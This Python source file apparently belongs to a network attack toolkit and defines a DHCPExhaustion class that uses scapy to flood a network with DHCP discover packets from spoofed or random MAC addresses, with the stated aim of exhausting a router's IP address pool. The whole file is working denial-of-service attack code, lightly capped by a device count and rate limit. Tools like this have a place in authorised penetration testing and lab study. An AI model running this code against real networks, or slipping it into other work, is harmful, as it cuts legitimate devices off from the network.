import random
import time
import threading
import re
from typing import List
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
from .base_attack import BaseAttack
from collections import deque

class DHCPExhaustion(BaseAttack):
    """Simulate multiple DHCP clients to exhaust router's IP pool"""
    
    def __init__(self, interface: str,
                 num_devices: int = 50,
                 request_options: List[int] = None,
                 client_src: List[str] = None):
        """
        Initialize DHCP exhaustion attack
        
        :param num_devices: Number of fake devices to simulate
        """
        super().__init__(interface)
        if num_devices < 1:
            raise ValueError("Number of devices must be at least 1")
        self.num_devices = num_devices
        self.request_options = request_options or list(range(81))
        self.client_src = self._validate_macs(client_src) if client_src else None
        self.mac_pool = deque(self.client_src) if client_src else None
        self.sent_macs = set()
        self.lock = threading.Lock()

    def _validate_macs(self, mac_list: List[str]) -> List[str]:
        """Validate and normalize MAC addresses"""
        validated = []
        pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"

        for mac in mac_list:
            if not re.match(pattern, mac):
                raise ValueError(f"Invalid MAC address format: {mac}")
            # Normalize to lowercase with colons
            normalized = mac.lower().replace('-', ':')
            validated.append(normalized)

        return validated

    def _generate_mac(self) -> str:
        """Generate MAC from pool or randomly"""
        if self.mac_pool:
            # Cycle through provided MACs
            mac = self.mac_pool[0]
            self.mac_pool.rotate(-1)
            return mac
        # Fallback to random generation
        while True:
            mac = "de:ad:%02x:%02x:%02x:%02x" % (
                random.randint(0, 0xff),
                random.randint(0, 0x7f),
                random.randint(0, 0xff),
                random.randint(0, 0xff)
            )
            if mac not in self.sent_macs:
                self.sent_macs.add(mac)
                return mac

    def _validate_options(self):
        """Ensure requested options are valid DHCP option codes"""
        if not all(0 <= opt <= 255 for opt in self.request_options):
            raise ValueError("DHCP options must be between 0-255")

    def _create_dhcp_packet(self):
        """Build DHCP discovery packet"""
        mac = self._generate_mac()
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
               IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / \
               BOOTP(chaddr=mac) / \
               DHCP(options=[("message-type", "discover"), 
                            ("client_id", mac),
                            ("param_req_list", self.request_options),
                            "end"])

    def _send_loop(self):
        """Main attack loop with rate limiting"""
        try:
            sent_count = 0
            base_pps = max(1, self.num_devices)  # Ensure at least 1 pps
            allowed_pps = self._rate_limit(base_pps)
            delay = 1.0 / allowed_pps

            while self.running and sent_count < self.num_devices:
                pkt = self._create_dhcp_packet()
                sendp(pkt, iface=self.interface, verbose=False)
                self.logger.info(f"Sent DHCP request from {pkt.src} ({sent_count+1}/{self.num_devices})")
                sent_count += 1
                time.sleep(delay)

            if sent_count >= self.num_devices:
                self.logger.info(f"Completed {self.num_devices} DHCP requests")
                self.stop()

        except Exception as e:
            self.logger.error(f"DHCP loop error: {str(e)}")
            self.stop()

    def start(self):
        """Launch attack thread"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._send_loop)
            self.thread.start()
            self.logger.info(f"Started DHCP exhaustion with {self.num_devices} devices")

    def stop(self):
        """Stop attack thread"""
        self.running = False
        # only join if called from a different thread
        if self.thread and self.thread.is_alive() \
           and threading.current_thread() is not self.thread:
            self.thread.join()
        self.logger.info("DHCP exhaustion stopped")